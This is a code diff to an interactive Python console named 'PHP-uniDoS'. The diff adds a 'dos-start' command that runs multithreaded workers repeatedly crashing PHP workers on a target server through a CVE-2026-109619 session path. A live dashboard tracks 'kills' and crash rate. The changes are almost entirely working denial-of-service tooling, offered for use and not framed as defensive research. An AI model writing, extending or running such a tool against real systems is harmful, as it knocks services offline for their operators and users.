@@ -51,7 +51,8 @@ BANNER = r"""
   109618 [strategy]   Multipart parser OOM probe
   109619              Experimental backtrace -> early INI probe
   session             Session lifecycle probe (A->B, single round)
-  dos [rounds]        Sustained DoS — loop session A→B (Ctrl+C to stop)
+  dos [rounds]        Sustained DoS — simple log
+  dos-start           Sustained DoS — live dashboard (Ctrl+C to stop)
   set                 Show settable parameters
   show                Show current config
   help                Full help
@@ -66,7 +67,8 @@ Commands:
                               Strategies: part-headers, empty-files, form-value, files-registration
   109619                      Experimental fatal-backtrace -> early INI path
   session                     Probe CVE-2026-109619 session A->B path (single round)
-  dos [rounds]                Sustained DoS — loop session A→B crash (Ctrl+C to stop)
+  dos [rounds]                Sustained DoS — simple log output
+  dos-start                   Sustained DoS — live dashboard (Ctrl+C to stop)
   set <key> <value>           Set parameter (see 'set' for list)
   help                        Show this help
   exit / quit                 Exit
@@ -145,6 +147,7 @@ class Console:
                 "109619": lambda *_: self.cmd_109619(),
                 "session": lambda *_: self.cmd_session(),
                 "dos": self.cmd_dos,
+                "dos-start": lambda *_: self.cmd_dos_start(),
                 "set": self.cmd_set,
                 "help": lambda *_: print(HELP),
                 "exit": lambda *_: sys.exit(0),
@@ -509,6 +512,116 @@ class Console:
               f" {counter} rounds in {elapsed:.1f}s\033[0m")
         if crashed and elapsed > 0:
             print(f"  \033[92m{crashed / elapsed:.2f} crashes/sec\033[0m")
+
+    def cmd_dos_start(self):
+        import threading
+        self.require_target()
+        threads = self.dos_threads
+        upload_path = self.path("session-upload")
+        producer_body = multipart_producer(self.field_bytes, "candidate",
+                                           part_headers=self.part_headers)
+        consumer_body = multipart_consumer()
+        payload_size = human_size(len(producer_body))
+        lock = threading.Lock()
+        crashed = 0
+        failed = 0
+        log = []
+        stop = threading.Event()
+        start_time = time.monotonic()
+        LOG_MAX = 14
+
+        def attack_worker():
+            nonlocal crashed, failed
+            while not stop.is_set():
+                result = self._dos_round(upload_path, producer_body, consumer_body)
+                if stop.is_set():
+                    return
+                ts = time.strftime("%H:%M:%S")
+                with lock:
+                    if result == "crashed":
+                        crashed += 1
+                    else:
+                        failed += 1
+                    total = crashed + failed
+                    log.append((ts, total, result))
+                    if len(log) > LOG_MAX:
+                        del log[0]
+
+        def draw():
+            elapsed = time.monotonic() - start_time
+            hrs, rem = divmod(int(elapsed), 3600)
+            mins, secs = divmod(rem, 60)
+            uptime = f"{hrs:02d}:{mins:02d}:{secs:02d}"
+            with lock:
+                c, f = crashed, failed
+                recent = list(log)
+            r = c + f
+            rate = c / elapsed if elapsed > 0 else 0
+            pct = f"{c * 100 // r}%" if r > 0 else "--"
+            bar = "─" * 58
+            out = []
+            out.append("")
+            out.append(f"  \033[1;93mPHP-uniDoS\033[0m  CVE-2026-109619  \033[1mSustained DoS\033[0m")
+            out.append(f"  Target:  \033[97m{self.target}\033[0m")
+            out.append(f"  Threads: {threads}  |  Payload: {payload_size}  |  Keep-alive")
+            out.append(f"  {bar}")
+            out.append(f"  \033[1mUptime:\033[0m {uptime}    "
+                       f"\033[1mKills:\033[0m \033[92m{c}\033[0m    "
+                       f"\033[1mRate:\033[0m \033[92m{rate:.2f}/s\033[0m")
+            out.append(f"  \033[1mRounds:\033[0m {r:<8d}  "
+                       f"\033[1mFailed:\033[0m {f:<6d}  "
+                       f"\033[1mSuccess:\033[0m {pct}")
+            out.append(f"  {bar}")
+            for ts, num, result in reversed(recent):
+                if result == "crashed":
+                    tag = f"\033[92m{'KILL':>8s}\033[0m"
+                else:
+                    tag = f"\033[91m{result:>8s}\033[0m"
+                out.append(f"  \033[2m{ts}\033[0m  #{num:<6d} {tag}")
+            for _ in range(LOG_MAX - len(recent)):
+                out.append("")
+            out.append(f"  {bar}")
+            out.append(f"  \033[2mCtrl+C to stop\033[0m")
+            out.append("")
+            sys.stdout.write("\033[H")
+            for line in out:
+                sys.stdout.write(f"{line}\033[K\n")
+            sys.stdout.flush()
+
+        sys.stdout.write("\033[2J\033[H")
+        sys.stdout.write("\033[?25l")
+        sys.stdout.flush()
+        pool = [threading.Thread(target=attack_worker, daemon=True)
+                for _ in range(threads)]
+        try:
+            for t in pool:
+                t.start()
+            while any(t.is_alive() for t in pool):
+                draw()
+                time.sleep(0.5)
+            draw()
+        except KeyboardInterrupt:
+            stop.set()
+            for t in pool:
+                t.join(timeout=2)
+        finally:
+            sys.stdout.write("\033[?25h")
+            sys.stdout.flush()
+        elapsed = time.monotonic() - start_time
+        with lock:
+            c, f = crashed, failed
+        r = c + f
+        sys.stdout.write("\033[2J\033[H")
+        print(f"\033[1;93mPHP-uniDoS\033[0m  Sustained DoS — finished\n")
+        print(f"  Target:  {self.target}")
+        print(f"  Threads: {threads}  |  Payload: {payload_size}\n")
+        print(f"  \033[1mWorkers crashed:\033[0m  \033[92m{c}\033[0m")
+        print(f"  \033[1mFailed rounds:\033[0m    {f}")
+        print(f"  \033[1mTotal rounds:\033[0m     {r}")
+        print(f"  \033[1mDuration:\033[0m         {elapsed:.1f}s")
+        if c and elapsed > 0:
+            print(f"  \033[1mCrash rate:\033[0m       \033[92m{c / elapsed:.2f}/s\033[0m")
+        print()
 
     def cmd_set(self, key=None, value=None, *_):
         if key is None:
